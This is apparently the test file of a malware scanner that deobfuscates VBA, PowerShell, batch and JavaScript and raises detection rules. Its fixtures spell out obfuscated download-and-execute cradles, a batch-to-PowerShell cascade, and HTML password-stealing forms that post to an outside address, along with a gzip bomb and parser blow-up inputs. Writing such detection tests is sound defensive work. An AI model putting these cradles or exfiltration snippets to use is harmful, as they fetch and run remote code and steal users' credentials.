"""Tests for static script deobfuscation and the VBA deep-analysis heuristics."""

import base64
import gzip
import io
import time
import zlib
from pathlib import Path

import pikepdf
import pytest

from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core import js_deobf, script_deobf
from malaz.core.dispatcher import Dispatcher
from malaz.core.script_deobf import extract_vba_strings
from malaz.models import RiskLevel
from malaz.pipelines.office_pipeline import OfficePipeline

# -- extract_vba_strings --------------------------------------------------- #


def test_literal_concatenation():
    assert extract_vba_strings('x = "pow" & "ershell"') == ["powershell"]


def test_chr_concatenation():
    # Chr(112)=p, Chr(111)=o, Chr(119)=w
    assert extract_vba_strings("x = Chr(112) & Chr(111) & Chr(119)") == ["pow"]


def test_mixed_literal_and_chr():
    # "cmd" & Chr(46)="." & "exe"
    assert extract_vba_strings('x = "cmd" & Chr(46) & "exe"') == ["cmd.exe"]


def test_single_plain_literal_is_skipped():
    # Not obfuscated -> the raw scan already sees it.
    assert extract_vba_strings('x = "hello world"') == []


def test_single_chr_is_returned():
    assert extract_vba_strings("x = Chr(65)") == ["A"]


def test_line_continuation_is_joined():
    code = '"pow" _\n& "ershell"'
    assert extract_vba_strings(code) == ["powershell"]


def test_plus_is_not_concatenation():
    # '+' is not the VBA string connector we reconstruct.
    assert extract_vba_strings('x = "a" + "b"') == []


def test_escaped_quotes():
    # "say ""hi""" -> say "hi"
    assert extract_vba_strings('x = "say ""hi""" & "!"') == ['say "hi"!']


def test_multiple_separate_runs():
    code = 'a = "foo" & "bar"\nb = "x" & "y"'
    assert extract_vba_strings(code) == ["foobar", "xy"]


# -- _vba_deep_indicators -------------------------------------------------- #


def _rule_ids(indicators):
    return {i.rule_id for i in indicators}


def test_obfuscated_keyword_reconstructed():
    p = OfficePipeline()
    # "powershell" is hidden (only appears once reassembled), not in raw code.
    out = p._vba_deep_indicators("x = 1", ["powershell -enc abc"], has_autoexec=False)
    assert "OFFICE_VBA_OBFUSCATED" in _rule_ids(out)


def test_obfuscated_keyword_anchors_with_autoexec():
    p = OfficePipeline()
    out = p._vba_deep_indicators("auto_open", ["net.webclient"], has_autoexec=True)
    ind = next(i for i in out if i.rule_id == "OFFICE_VBA_OBFUSCATED")
    assert ind.severity.name == "CRITICAL"


def test_not_obfuscated_when_visible_raw():
    p = OfficePipeline()
    # "powershell" already in raw code -> no obfuscation indicator.
    out = p._vba_deep_indicators("run powershell now", ["powershell"], has_autoexec=False)
    assert "OFFICE_VBA_OBFUSCATED" not in _rule_ids(out)


def test_download_execute_chain_detected():
    p = OfficePipeline()
    code = 'URLDownloadToFile 0, url, path, 0\nShell "cmd.exe"'
    out = p._vba_deep_indicators(code.lower(), [], has_autoexec=False)
    assert "OFFICE_VBA_DL_EXEC" in _rule_ids(out)


def test_download_alone_is_not_a_chain():
    p = OfficePipeline()
    out = p._vba_deep_indicators("urldownloadtofile 0, url, path", [], has_autoexec=False)
    assert "OFFICE_VBA_DL_EXEC" not in _rule_ids(out)


def test_encoded_powershell_detected():
    p = OfficePipeline()
    out = p._vba_deep_indicators('shell "powershell -encodedcommand jqbe"', [], False)
    assert "OFFICE_VBA_ENC_PS" in _rule_ids(out)


def test_lolbin_detected():
    p = OfficePipeline()
    out = p._vba_deep_indicators('shell "regsvr32 /s /u foo.dll"', [], False)
    assert "OFFICE_VBA_LOLBIN" in _rule_ids(out)


def test_benign_macro_has_no_deep_indicators():
    p = OfficePipeline()
    out = p._vba_deep_indicators("msgbox \"hello world\"\nrange(\"a1\").value = 1", [], False)
    assert out == []


# ===========================================================================
# Spec 016 / DET-003 tests
# ===========================================================================

_SHARED_DISPATCHER: Dispatcher | None = None


def _dispatcher() -> Dispatcher:
    global _SHARED_DISPATCHER
    if _SHARED_DISPATCHER is None:
        _SHARED_DISPATCHER = Dispatcher(
            av_scanner=WindowsDefenderScanner(enabled=False),
            clam_scanner=ClamAVScanner(enabled=False),
        )
    return _SHARED_DISPATCHER


def _scan(tmp_path: Path, name: str, content: str | bytes):
    p = tmp_path / name
    p.write_bytes(content.encode("utf-8") if isinstance(content, str) else content)
    return _dispatcher().scan_path(p)


def _scan_rule_ids(res) -> set[str]:
    return {ind.rule_id for ind in res.all_indicators()}


def _find_ind(res, rule_id: str):
    return [ind for ind in res.all_indicators() if ind.rule_id == rule_id]


def _ps_enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")


def _pdf_with_js(js_code: str) -> bytes:
    with pikepdf.new() as pdf:
        pdf.add_blank_page(page_size=(200, 200))
        js_stream = pdf.make_stream(js_code.encode("utf-8"))
        pdf.Root["/OpenAction"] = pikepdf.Dictionary(
            S=pikepdf.Name("/JavaScript"),
            JS=js_stream,
        )
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()


# --------------------------------------------------------------------------- #
# 6.1 PowerShell deobfuscation (including bite-test target #1)
# --------------------------------------------------------------------------- #


def test_ps_backtick_deobfuscation_uncovers_cradle(tmp_path):
    """Dedicated bite-test target for ps-deobf-backtick-aus."""
    payload = (
        "I`Nv`Ok`E-E`Xp`Re`Ss`Io`N "
        "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/p')"
    )
    res = _scan(tmp_path, "cradle.ps1", payload)
    ids = _scan_rule_ids(res)
    assert "GEN_SCRIPT_DEOBFUSCATED" in ids
    assert _find_ind(res, "GEN_SCRIPT_DEOBFUSCATED")[0].weight == 30
    assert "GEN_PS_CRADLE" in ids
    assert "GEN_IOC" in ids


@pytest.mark.parametrize(
    ("name", "prefix"),
    [
        ("comment_quote.ps1", "# '\n"),
        ("paren_comment.ps1", "(1)#'\n"),
        ("brace_comment.ps1", "{1}#'\n"),
        ("index_comment.ps1", "$a[0]#'\n"),
        ("str_comment.ps1", "'a'#'\n"),
        ("here_sq.ps1", "@'\n'\n'@\n"),
        ("here_dq.ps1", '@"\n"\n"@\n$z=\'"\'\n'),
        ("esc_quote.ps1", "$x = `' ; "),
        ("esc_quote_hash.ps1", "echo `'# ; "),
        ("mid_token_hash.ps1", "echo a#b; "),
    ],
)
def test_ps_backtick_state_machine_defeats_desync_tricks(tmp_path, name, prefix):
    cradle = (
        "I`Nv`Ok`E-E`Xp`Re`Ss`Io`N "
        "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/p')"
    )
    res = _scan(tmp_path, name, prefix + cradle)
    ids = _scan_rule_ids(res)
    assert "GEN_SCRIPT_DEOBFUSCATED" in ids, name
    assert "GEN_PS_CRADLE" in ids, name


def test_ps_format_concat_char_array_and_encoded_command(tmp_path):
    enc_b64 = _ps_enc("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.6/x')")

    # 1. Format operator + concat + -EncodedCommand (single GEN_PS_ENCODED!)
    ps1 = (
        '("{1}{0}" -f "EX","I") '
         f"('pow'+'er'+'shell -e'+'nc {enc_b64}')"
    )
    res1 = _scan(tmp_path, "fmt_concat.ps1", ps1)
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res1)
    assert len(_find_ind(res1, "GEN_PS_ENCODED")) == 1

    # 2. [char[]]@(...) -join ''
    cmd = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
    codes = ",".join(str(ord(c)) for c in cmd)
    res2 = _scan(tmp_path, "char_arr.ps1", f"$c = [char[]]@({codes}) -join ''")
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res2)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res2)

    # 3. -join [char[]](...)
    res3 = _scan(tmp_path, "join_char.ps1", f"$c = -join [char[]]({codes})")
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res3)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res3)

    # 4. Already-plaintext -EncodedCommand + harmless 'a'+'b' must NOT trigger GEN_SCRIPT_DEOBFUSCATED
    ps_plain_enc = f"powershell -enc {enc_b64}\n$x = 'hello' + ' world'\n"
    res4 = _scan(tmp_path, "plain_enc.ps1", ps_plain_enc)
    assert "GEN_PS_ENCODED" in _scan_rule_ids(res4)
    assert "GEN_SCRIPT_DEOBFUSCATED" not in _scan_rule_ids(res4)


def test_ps_gzip_utf8_utf16_and_raw_deflate_vs_binary_noise(tmp_path):
    inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.8/gz')"

    # 1. GZip UTF-8
    gz_u8 = base64.b64encode(gzip.compress(inner.encode("utf-8"))).decode("ascii")
    res_u8 = _scan(
        tmp_path,
        "gz_u8.ps1",
        f"$b=[Convert]::FromBase64String('{gz_u8}')",
    )
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_u8)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_u8)

    # 2. GZip UTF-16LE (without BOM)
    gz_u16 = base64.b64encode(gzip.compress(inner.encode("utf-16-le"))).decode("ascii")
    res_u16 = _scan(
        tmp_path,
        "gz_u16.ps1",
        f"$b=[Convert]::FromBase64String('{gz_u16}')",
    )
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_u16)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_u16)

    # 3. Raw Deflate with DeflateStream context
    comp = zlib.compressobj(level=6, wbits=-15)
    raw_def = comp.compress(inner.encode("utf-8")) + comp.flush()
    b64_def = base64.b64encode(raw_def).decode("ascii")
    res_def = _scan(
        tmp_path,
        "deflate.ps1",
        f"New-Object IO.Compression.DeflateStream([Convert]::FromBase64String('{b64_def}'))",
    )
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_def)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res_def)

    # 4. Binary PNG Base64 & raw-deflate 0x03 0x00 false match: no GEN_DEOBF_LIMIT, no crash
    fake_png_b64 = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(range(128))).decode("ascii")
    false_def_b64 = base64.b64encode(b"\x03\x00" + bytes(range(20, 60))).decode("ascii")
    res_bin = _scan(
        tmp_path,
        "bin_b64.ps1",
        f"# DeflateStream\n$a=[Convert]::FromBase64String('{fake_png_b64}')\n"
        f"$b=[Convert]::FromBase64String('{false_def_b64}')\n",
    )
    assert "GEN_DEOBF_LIMIT" not in _scan_rule_ids(res_bin)
    assert "GEN_SCRIPT_DEOBFUSCATED" not in _scan_rule_ids(res_bin)


# --------------------------------------------------------------------------- #
# 6.2 Batch deobfuscation & 2-stage cascades
# --------------------------------------------------------------------------- #


def test_batch_carets_set_slicing_replace_and_cascade(tmp_path):
    # 1. Caret obfuscation + escaped quote + URL carets
    bat1 = (
        '@echo off\r\n'
        '^"p^o^w^e^r^s^h^e^l^l^" -w hidden '
        'IEX (New-Object Net.WebClient).DownloadString(\'http^://198^.51^.100^.5^/p\')\r\n'
    )
    res1 = _scan(tmp_path, "carets.bat", bat1)
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res1)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res1)
    assert "GEN_IOC" in _scan_rule_ids(res1)

    # 2. Single-line caret-obfuscated set chain + quoted set
    bat2 = (
        's^e^t a=pow&s^e^t "b=ershell"&%a%%b% -nop -c '
        '"IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.5/q\')"\r\n'
    )
    res2 = _scan(tmp_path, "setchain.bat", bat2)
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res2)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res2)

    # 3. Negative slicing, delayed expansion, %COMSPEC:~...%, case-insensitive replace, empty old ignored
    bat3 = (
        "set x=xxpowershellZZ\r\n"
        "set y=JJJcertutilJJJ\r\n"
        "set d=!x:~2,-2! -c \"echo !COMSPEC:~0,3! %y:jjj=% -urlcache %x:=ABC%\"\r\n"
    )
    out3 = script_deobf.deobfuscate_batch(bat3, explicit_script=True)
    assert "powershell" in out3.text.lower()
    assert "C:\\" in out3.text
    assert "certutil" in out3.text.lower()
    assert "%x:=ABC%" in out3.text  # empty old must be ignored

    # 4. 2-stage .bat -> PowerShell cascade (caret batch + backtick PS)
    bat4 = (
        "s^e^t p=p^o^w^e^r^s^h^e^l^l\r\n"
        "%p% -c \"I`Nv`Ok`E-E`Xp`Re`Ss`Io`N "
        "(New-`Ob`ject Net.WebClient).D`Ow`Nl`Oa`Ds`Tr`In`G('http://198.51.100.5/c')\"\r\n"
    )
    res4 = _scan(tmp_path, "cascade.bat", bat4)
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res4)
    assert "GEN_PS_CRADLE" in _scan_rule_ids(res4)


# --------------------------------------------------------------------------- #
# 6.3 JavaScript (.js, PDF-JS, HTML/WebPipeline)
# --------------------------------------------------------------------------- #


def test_js_es6_unicode_atob_array_reverse_join_and_string_table(tmp_path):
    # 1. Standalone .js combining \u{...}, atob, .reverse().join(''), and hex string table
    atob_payload = base64.b64encode(
        b"eval(new ActiveXObject('WScript.Shell').Run('powershell http://198.51.100.9/js'))"
    ).decode("ascii")
    js_code = (
        'var _0x1 = ["\\u{70}\\u{6f}\\u{77}\\u{65}\\u{72}\\u{73}\\u{68}\\u{65}\\u{6c}\\u{6c}", '
        '"https://198.51.100.9/c2"];\n'
        'var cmd = ["l","l","e","h","s","r","e","w","o","p"].reverse().join("");\n'
        'var target = _0x1[0x1];\n'
        f'var dec = window.atob("{atob_payload}");\n'
    )
    res_js = _scan(tmp_path, "obf.js", js_code)
    assert "GEN_SCRIPT_DEOBFUSCATED" in _scan_rule_ids(res_js)
    assert "GEN_SUSPICIOUS_STRINGS" in _scan_rule_ids(res_js)
    assert "GEN_IOC" in _scan_rule_ids(res_js)

    # 2. PDF JavaScript via pdf_javascript.py (ES6 unicode + string table revealing eval()!)
    pdf_js = (
        'var _t = ["\\u{65}\\u{76}\\u{61}\\u{6c}("];\n'
        "var x = _t[0x0] + '1)';\n"
    )
    res_pdf = _scan(tmp_path, "obf_js.pdf", _pdf_with_js(pdf_js))
    assert "PDF_JS_DEOBFUSCATED" in _scan_rule_ids(res_pdf)
    assert res_pdf.risk_level == RiskLevel.RED

    # 3. HTML / WebContentPipeline with obfuscated reverse().join() + string table exfil
    html_code = (
        "<!doctype html><html><body>"
        "<form><input type='password' name='pw'></form>"
        "<script>"
        'var _s = [["/","9",".","0","0","1",".","1","5",".","8","9","1",'
        '"/","/",":","s","p","t","t","h"].reverse().join("")];'
        "fetch(_s[0], {method: 'POST', body: document.querySelector('input').value});"
        "</script></body></html>"
    )
    res_html = _scan(tmp_path, "obf_phish.html", html_code)
    assert "HTML_CREDENTIAL_FORM" in _scan_rule_ids(res_html)


# --------------------------------------------------------------------------- #
# 6.4 Zero False Positives & Bomb / Completeness Protection
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("name", "content"),
    [
        (
            "benign.ps1",
            ('Write-Host ("[{0}] {1}: {2}" -f $a, $b, $c)\n'
            '$msg = "Zeile1`nZeile2"\n'
            "$lit = 'literal `tick'\n"
            "$codes = [int[]]@(200,201,204,301,302,400,401,403)\n"),
        ),
        (
            "benign.bat",
            ("@echo off\r\n"
            "%COMSPEC% /c echo Hello\r\n"
            "set PATH=%PATH%;C:\\Tools\r\n"
            "echo %PATH%\r\n"
            "echo ^^hello\r\n"
            "echo ^^^^^^^^^^^^^^^^\r\n"
            "set TS=%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%\r\n"
            "echo ^<tag^>\r\n"),
        ),
        (
            "benign.js",
            ('const u = "https://api." + "example.com";\n'
            'const j = atob("eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20ifQ==");\n'
            "const m = ['Jan', 'Feb'];\n"
            "console.log(m[0], u, j);\n"),
        ),
        (
            "benign.md",
            "# Documentation\n\n" + ("Use `git status` and `pytest -q` daily.\n" * 50),
        ),
        (
            "large_benign.bat",
            "@echo off\r\n" + ("echo Processing item ok\r\n" * 13_000),  # ~300 KiB 2-stage cascade
        ),
        (
            "it_log.txt",
            "2026-11-25 INFO service started (powershell host ready)\n"
            + ("2026-11-25 INFO heartbeat ok\n" * 35_000),  # ~1 MiB generic text log
        ),
    ],
)
def test_benign_scripts_and_logs_zero_fp_zero_limit(tmp_path, name, content):
    res = _scan(tmp_path, name, content)
    ids = _scan_rule_ids(res)
    assert "GEN_SCRIPT_DEOBFUSCATED" not in ids, name
    assert "GEN_DEOBF_LIMIT" not in ids, name
    assert res.risk_level == RiskLevel.GREEN, (name, ids, res.score)
    if name != "it_log.txt":
        assert res.score == 0, (name, ids, res.score)


def test_ps_gzip_bomb_triggers_deobf_limit(tmp_path):
    """Dedicated bite-test target for deobf-gzip-bomb-limit-still."""
    bomb_gz = gzip.compress(b"\x00" * (10 * 1024 * 1024), compresslevel=9)
    b64_bomb = base64.b64encode(bomb_gz).decode("ascii")
    ps = f"$b = [Convert]::FromBase64String('{b64_bomb}')"
    t0 = time.perf_counter()
    res = _scan(tmp_path, "gz_bomb.ps1", ps)
    assert time.perf_counter() - t0 < 1.0
    assert "GEN_DEOBF_LIMIT" in _scan_rule_ids(res)
    assert res.is_incomplete is True


def test_513kib_padding_triggers_limits_across_ps1_pdf_and_html(tmp_path):
    pad_ps = ("# " + ("A" * 100) + "\n") * 5_200  # > 512 KiB
    res_ps = _scan(tmp_path, "pad.ps1", pad_ps + "I`Nv`Ok`E-E`Xp`Re`Ss`Io`N\n")
    assert "GEN_DEOBF_LIMIT" in _scan_rule_ids(res_ps)
    assert res_ps.is_incomplete is True

    pad_js = ("// " + ("B" * 100) + "\n") * 5_200  # > 512 KiB
    res_pdf = _scan(tmp_path, "pad_js.pdf", _pdf_with_js(pad_js + 'eval("1");'))
    assert "PDF_JS_PARSE_WARN" in _scan_rule_ids(res_pdf)
    assert res_pdf.is_incomplete is True

    res_html = _scan(
        tmp_path,
        "pad.html",
        f"<!doctype html><html><body><script>{pad_js}eval('1');</script></body></html>",
    )
    assert "WEB_PARSE_LIMIT" in _scan_rule_ids(res_html)
    assert res_html.is_incomplete is True


def test_deobf_dos_blowups_and_pass_depth_limits_are_fast_and_incomplete(tmp_path):
    # 1. Exponential batch expansion
    exp_bat = "set a=" + ("X" * 100) + "\r\n" + ("set a=%a%%a%\r\n" * 30)
    t0 = time.perf_counter()
    r1 = script_deobf.deobfuscate_batch(exp_bat, explicit_script=True)
    assert time.perf_counter() - t0 < 0.5
    assert r1.limit_hit is True

    # 2. Multi-expansion %a% x 300
    multi_bat = "set a=" + ("A" * 2000) + "\r\necho " + ("%a%" * 300) + "\r\n"
    t0 = time.perf_counter()
    r2 = script_deobf.deobfuscate_batch(multi_bat, explicit_script=True)
    assert time.perf_counter() - t0 < 0.5
    assert r2.limit_hit is True

    # 3. PowerShell -f blowup
    fmt_ps = f'("{ "{0}" * 20_000 }" -f "a")'
    t0 = time.perf_counter()
    r3 = script_deobf.deobfuscate_powershell(fmt_ps, explicit_script=True)
    assert time.perf_counter() - t0 < 0.5
    assert r3.limit_hit is True

    # 4. JS string-table expansion blowup
    js_blow = 'var a=["' + ("A" * 2000) + '"]; var s=' + "+".join(["a[0]"] * 300) + ";"
    t0 = time.perf_counter()
    r4 = js_deobf.deobfuscate_js_detailed(js_blow, explicit_script=True)
    assert time.perf_counter() - t0 < 0.5
    assert r4.limit_hit is True

    # 5. Multi-chunk HTML budget (500 x 4 KiB <script>)
    chunk = "<script>// " + ("C" * 4080) + "</script>"
    html_many = "<!doctype html><html><body>" + (chunk * 500) + "</body></html>"
    t0 = time.perf_counter()
    from malaz.models import AnalysisContext
    from malaz.pipelines.web_pipeline import WebContentPipeline
    raw_many = html_many.encode("utf-8")
    ctx_many = AnalysisContext(
        path=tmp_path / "many_scripts.html",
        data=raw_many,
        detected_type="html",
        size=len(raw_many),
    )
    t0 = time.perf_counter()
    inds_many = WebContentPipeline().analyze(ctx_many)
    assert time.perf_counter() - t0 < 1.0
    assert any(i.rule_id == "WEB_PARSE_LIMIT" for i in inds_many)

    # 6. 4-layer nested obfuscation (> MAX_DEOBF_PASSES=3)
    layer = "eval('x')"
    for _ in range(4):
        b64_l = base64.b64encode(layer.encode("utf-8")).decode("ascii")
        layer = f"atob('{b64_l}')"
    r6 = js_deobf.deobfuscate_js_detailed(layer, explicit_script=True)
    assert r6.limit_hit is True
    assert r6.limit_reason == script_deobf.REASON_PASS_LIMIT


def test_review_r1_regressions_dos_unicode_paren_large_html_and_obf_sink(tmp_path):
    """Regression tests for Spec 016 code-review r1 findings (F2, F3, F4, F5, F6, F7)."""
    # F2A: [char[]]( * 55_000 + ) and without ) must finish strictly O(N) < 0.3s
    for hostile_ca in ("[char[]](" * 55_000 + ")", "[char[]](" * 55_000):
        t0 = time.perf_counter()
        r = script_deobf.deobfuscate_powershell(hostile_ca, explicit_script=True)
        assert time.perf_counter() - t0 < 1.5
        assert isinstance(r.text, str)

    # F2B & F2C: unclosed/escaped quotes in -f and + must finish strictly O(N) < 0.3s
    for hostile_q in (
        "-f " + ("'" * 500_000),
        "-f " + ('"' * 500_000),
        "-f " + ('"`' * 250_000),
        "+" + ('"`' * 250_000),
    ):
        t0 = time.perf_counter()
        r = script_deobf.deobfuscate_powershell(hostile_q, explicit_script=True)
        assert time.perf_counter() - t0 < 1.5
        assert isinstance(r.text, str)

    # F2D: 35_000 unclosed var a=[ + 260 KiB padding must finish strictly O(N) < 0.3s
    hostile_js = ("var a=[" * 35_000) + ("A" * 260_000)
    t0 = time.perf_counter()
    rjs = js_deobf.deobfuscate_js_detailed(hostile_js, explicit_script=True)
    assert time.perf_counter() - t0 < 1.5
    assert isinstance(rjs.text, str)

    # F3: Unicode superscript digit '²' in -f must NOT raise ValueError
    r_uni = script_deobf.deobfuscate_powershell('"{²}" -f "a"', explicit_script=True)
    assert r_uni.text == '"{²}" -f "a"'

    # F5: paren_wrapped with failed template must NOT duplicate '('
    expr_f5 = '("{0,-5}" -f "a" + "b")'
    f5_text, _, _, _ = script_deobf._eval_ps_format_f(expr_f5, 4096)
    assert f5_text == expr_f5

    # F4: harmless > 512 KiB HTML file containing '.join(' stays GREEN 0 with NO WEB_PARSE_LIMIT
    big_benign_html = (
        "<!doctype html><html><body>"
        + (
            "<p>Benign documentation paragraph about arrays and arr.join(', ') usage.</p>\n"
            * 8_500
        )
        + "</body></html>"
    )
    assert len(big_benign_html) > 550 * 1024
    res_big = _scan(tmp_path, "big_benign_join.html", big_benign_html)
    assert "WEB_PARSE_LIMIT" not in _scan_rule_ids(res_big)
    assert res_big.risk_level == RiskLevel.GREEN
    assert res_big.score == 0

    # F7: HTML <script> where the exfil sink itself ('fetch') is obfuscated via ES6 unicode
    obf_sink_html = (
        "<!doctype html><html><body>"
        "<form><input type='password' name='pw'></form>"
        "<script>"
        '\\u{66}\\u{65}\\u{74}\\u{63}\\u{68}("https://198.51.100.9/steal", '
        "{method: 'POST', body: document.querySelector('input').value});"
        "</script></body></html>"
    )
    res_sink = _scan(tmp_path, "obf_sink.html", obf_sink_html)
    assert "HTML_CREDENTIAL_FORM" in _scan_rule_ids(res_sink)
